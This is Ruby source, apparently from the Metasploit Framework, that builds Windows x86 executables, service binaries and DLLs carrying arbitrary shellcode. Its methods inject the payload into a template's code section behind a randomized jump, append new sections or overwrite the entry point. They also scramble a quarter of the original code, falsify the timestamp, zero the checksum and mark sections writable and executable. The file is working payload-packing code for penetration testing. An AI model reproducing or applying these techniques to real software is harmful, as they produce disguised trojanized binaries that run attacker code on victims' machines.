
module Msf::Util::EXE::Windows::X86
  include Msf::Util::EXE::Windows::Common

  def to_executable(framework, code, opts = {}, fmt = 'exe')
    return to_win32pe(framework, code, opts) if fmt == 'exe'
    return to_win32pe_service(framework, code, opts) if fmt == 'exe-service'
    return to_win32pe_dll(framework, code, opts) if fmt == 'dll'
    return to_winpe_only(framework, code, opts, ARCH_X86) if fmt == 'exe-only'
    return to_win32pe_old(framework, code, opts) if fmt == 'exe-small'
    nil
  end

  # to_win32pe
  #
  # @param  framework [Msf::Framework]
  # @param  code      [String]
  # @param  opts      [Hash]
  # @option opts      [String] :sub_method
  # @option opts      [String] :inject, Code to inject into the exe
  # @option opts      [String] :template
  # @option opts      [Symbol] :arch, Set to :x86 by default
  # @return           [String]
  def to_win32pe(framework, code, opts = {})

    # For backward compatibility, this is roughly equivalent to 'exe-small' fmt
    if opts[:sub_method]
      if opts[:inject]
        raise RuntimeError, 'NOTE: using the substitution method means no inject support'
      end

      # use
      return self.to_win32pe_exe_sub(framework, code, opts)
    end

    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_x86_windows.exe")

    # Copy the code to a new RWX segment to allow for self-modifying encoders
    payload = win32_rwx_exec(code)

    # Create a new PE object and run through sanity checks
    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)

    #try to inject code into executable by adding a section without affecting executable behavior
    if opts[:inject]
      injector = Msf::Exe::SegmentInjector.new({
          :payload  => code,
          :template => opts[:template],
          :arch     => :x86,
          :secname  => opts[:secname]
      })
      return injector.generate_pe
    end

    text = nil
    pe.sections.each {|sec| text = sec if sec.name == ".text"}

    raise RuntimeError, "No .text section found in the template" unless text

    unless text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
      raise RuntimeError, "The .text section does not contain an entry point"
    end

    p_length = payload.length + 256

    # If the .text section is too small, append a new section instead
    if text.size < p_length
      appender = Msf::Exe::SegmentAppender.new({
          :payload  => code,
          :template => opts[:template],
          :arch     => :x86,
          :secname  => opts[:secname]
      })
      return appender.generate_pe
    end

    # Store some useful offsets
    off_ent = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
    off_beg = pe.rva_to_file_offset(text.base_rva)

    # We need to make sure our injected code doesn't conflict with the
    # the data directories stored in .text (import, export, etc)
    mines = []
    pe.hdr.opt['DataDirectory'].each do |dir|
      next if dir.v['Size'] == 0
      next unless text.contains_rva?(dir.v['VirtualAddress'])
      delta = pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg
      mines << [delta, dir.v['Size']]
    end

    # Break the text segment into contiguous blocks
    blocks = []
    bidx   = 0
    mines.sort{|a,b| a[0] <=> b[0]}.each do |mine|
      bbeg = bidx
      bend = mine[0]
      blocks << [bidx, bend-bidx] if bbeg != bend
      bidx = mine[0] + mine[1]
    end

    # Add the ending block
    blocks << [bidx, text.size - bidx] if bidx < text.size - 1

    # Find the largest contiguous block
    blocks.sort!{|a,b| b[1]<=>a[1]}
    block = blocks.first

    # TODO: Allow the entry point in a different block
    if payload.length + 256 >= block[1]
      raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+257} found:#{block[1]})"
    end

    # Make a copy of the entire .text section
    data = text.read(0,text.size)

    # Pick a random offset to store the payload
    poff = rand(block[1] - payload.length - 256)

    # Flip a coin to determine if EP is before or after
    eloc = rand(2)
    eidx = nil

    # Pad the entry point with random nops
    entry = generate_nops(framework, [ARCH_X86], rand(200) + 51)

    # Pick an offset to store the new entry point
    if eloc == 0 # place the entry point before the payload
      poff += 256
      eidx = rand(poff-(entry.length + 5))
    else          # place the entry pointer after the payload
      poff -= [256, poff].min
      eidx = rand(block[1] - (poff + payload.length + 256)) + poff + payload.length
    end

    # Relative jump from the end of the nops to the payload
    entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')

    # Mangle 25% of the original executable
    1.upto(block[1] / 4) do
      data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
    end

    # Patch the payload and the new entry point into the .text
    data[block[0] + poff, payload.length] = payload
    data[block[0] + eidx, entry.length]   = entry

    # Create the modified version of the input executable
    exe = ''
    File.open(opts[:template], 'rb') {|fd| exe = fd.read(fd.stat.size)}

    a = [text.base_rva + block.first + eidx].pack("V")
    exe[exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = a
    exe[off_beg, data.length] = data

    tds = pe.hdr.file.TimeDateStamp
    exe[exe.index([tds].pack('V')), 4] = [tds - rand(0x1000000)].pack("V")

    cks = pe.hdr.opt.CheckSum
    unless cks == 0
      exe[exe.index([cks].pack('V')), 4] = [0].pack("V")
    end

    exe = clear_dynamic_base(exe, pe)
    pe.close

    exe
  end

  # to_winpe_only
  #
  # @param framework  [Msf::Framework]  The framework of you want to use
  # @param code       [String]
  # @param opts       [Hash]
  # @param arch       [String] Default is "x86"
  def to_winpe_only(framework, code, opts = {}, arch=ARCH_X86)

    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_#{arch}_windows.exe")

    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)

    exe = ''
    File.open(opts[:template], 'rb') {|fd| exe = fd.read(fd.stat.size)}

    pe_header_size = 0x18
    entryPoint_offset = 0x28
    section_size = 0x28
    characteristics_offset = 0x24
    virtualAddress_offset = 0x0c
    sizeOfRawData_offset = 0x10

    sections_table_offset =
      pe._dos_header.v['e_lfanew'] +
      pe._file_header.v['SizeOfOptionalHeader'] +
      pe_header_size

    sections_table_characteristics_offset = sections_table_offset + characteristics_offset

    sections_header = []
    pe._file_header.v['NumberOfSections'].times do |i|
      section_offset = sections_table_offset + (i * section_size)
      sections_header << [
        sections_table_characteristics_offset + (i * section_size),
        exe[section_offset,section_size]
      ]
    end

    addressOfEntryPoint = pe.hdr.opt.AddressOfEntryPoint

    # look for section with entry point
    sections_header.each do |sec|
      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('V')[0]
      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('V')[0]
      characteristics = sec[1][characteristics_offset,0x4].unpack('V')[0]

      if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
        if (importsTable - addressOfEntryPoint) < code.length
          #shift original entry point to prevent tables overwriting
          addressOfEntryPoint = importsTable - code.length + 4

          entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('V')
        end
        # put this section writable
        characteristics |= 0x8000_0000
        newcharacteristics = [characteristics].pack('V')
        exe[sec[0],newcharacteristics.length] = newcharacteristics
      end
    end

    # put the shellcode at the entry point, overwriting template
    entryPoint_file_offset = pe.rva_to_file_offset(addressOfEntryPoint)
    exe[entryPoint_file_offset,code.length] = code
    exe = clear_dynamic_base(exe, pe)
    exe
  end

  # to_win32pe_old
  #
  # @param framework  [Msf::Framework]  The framework of you want to use
  # @param  code      [String]
  # @param  opts      [Hash]
  def to_win32pe_old(framework, code, opts = {})

    payload = code.dup
    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_x86_windows_old.exe")

    pe = ''
    File.open(opts[:template], "rb") {|fd| pe = fd.read(fd.stat.size)}

    if payload.length <= 2048
      payload << Rex::Text.rand_text(2048-payload.length)
    else
      raise RuntimeError, "The EXE generator now has a max size of 2048 " +
                          "bytes, please fix the calling module"
    end

    bo = pe.index('PAYLOAD:')
    unless bo
      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing \"PAYLOAD:\" tag"
    end
    pe[bo, payload.length] = payload

    pe[136, 4] = [rand(0x100000000)].pack('V')

    ci = pe.index("\x31\xc9" * 160)
    unless ci
      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing first \"\\x31\\xc9\""
    end
    cd = pe.index("\x31\xc9" * 160, ci + 320)
    unless cd
      raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing second \"\\x31\\xc9\""
    end
    rc = pe[ci+320, cd-ci-320]

    # 640 + rc.length bytes of room to store an encoded rc at offset ci
    enc = encode_stub(framework, [ARCH_X86], rc, ::Msf::Module::PlatformList.win32)
    lft = 640+rc.length - enc.length

    buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
    pe[ci, buf.length] = buf

    # Make the data section executable
    xi = pe.index([0xc0300040].pack('V'))
    pe[xi,4] = [0xe0300020].pack('V')

    # Add a couple random bytes for fun
    pe << Rex::Text.rand_text(rand(64)+4)
    pe
  end

  # to_win32pe_exe_sub
  #
  # @param framework  [Msf::Framework]  The framework of you want to use
  # @param code       [String]
  # @param opts       [Hash]
  # @return           [String]
  def to_win32pe_exe_sub(framework, code, opts = {})
    # Allow the user to specify their own DLL template
    set_template_default(opts, "template_x86_windows.exe")
    opts[:exe_type] = :exe_sub
    exe_sub_method(code,opts)
  end

  # Embeds shellcode within a Windows PE file implementing the Windows
  # service control methods.
  #
  # @param  framework   [Object]
  # @param  code        [String] shellcode to be embedded
  # @option opts        [Boolean] :sub_method use substitution technique with a
  #                                service template PE
  # @option opts        [String] :servicename name of the service, not used in
  #                               substitution technique
  #
  # @return [String] Windows Service PE file
  def to_win32pe_service(framework, code, opts = {})
    # Allow the user to specify their own service EXE template
    set_template_default(opts, "template_x86_windows_svc.exe")
    opts[:exe_type] = :service_exe
    exe_sub_method(code,opts)
  end



  # to_win32pe_dccw_gdiplus_dll
  #
  # @param framework  [Msf::Framework]  The framework of you want to use
  # @param code       [String]
  # @param opts       [Hash]
  # @option           [String] :exe_type
  # @option           [String] :dll
  # @option           [String] :inject
  # @return           [String]
  def to_win32pe_dccw_gdiplus_dll(framework, code, opts = {})
    set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: 'dccw_gdiplus')
    to_win32pe_dll(framework, code, opts)
  end
end